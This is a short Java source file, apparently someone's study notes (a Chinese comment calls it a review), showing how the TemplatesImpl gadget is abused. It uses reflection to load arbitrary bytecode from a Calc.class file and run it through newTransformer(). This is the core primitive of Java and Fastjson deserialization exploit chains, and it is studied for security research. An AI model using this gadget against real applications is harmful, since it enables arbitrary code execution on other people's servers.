package Fastjson;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.xml.transform.TransformerConfigurationException;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;

/**
 * @author L3ttuc3
 * @version 1.0
 * @date 2023/5/9 15:55
 */
public class ReviewDynamicLoadClass {
    public static void main(String[] args) throws Exception {
//        Class<? extends ClassLoader> aClass = ClassLoader.class;
//        Method defineClass = aClass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
//        defineClass.setAccessible(true);
//        byte[] bytes = Files.readAllBytes(Paths.get("src/main/java/EvalCode/Calc.class"));
//        Class aClass1 = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), bytes, 0, bytes.length);
//        aClass1.newInstance();
//
//        TemplatesImpl templates = new TemplatesImpl();
//        templates.newTransformer();


//        复习一下通过TemplatesImpl进行动态类加载打上去链子
        TemplatesImpl templates = new TemplatesImpl();
        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;

        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"L3ttuc3");

        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[][] bytes = {Files.readAllBytes(Paths.get("src/main/java/EvalCode/Calc.class"))};
        bytecodesField.set(templates,bytes);

        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

        templates.newTransformer();
    }
}
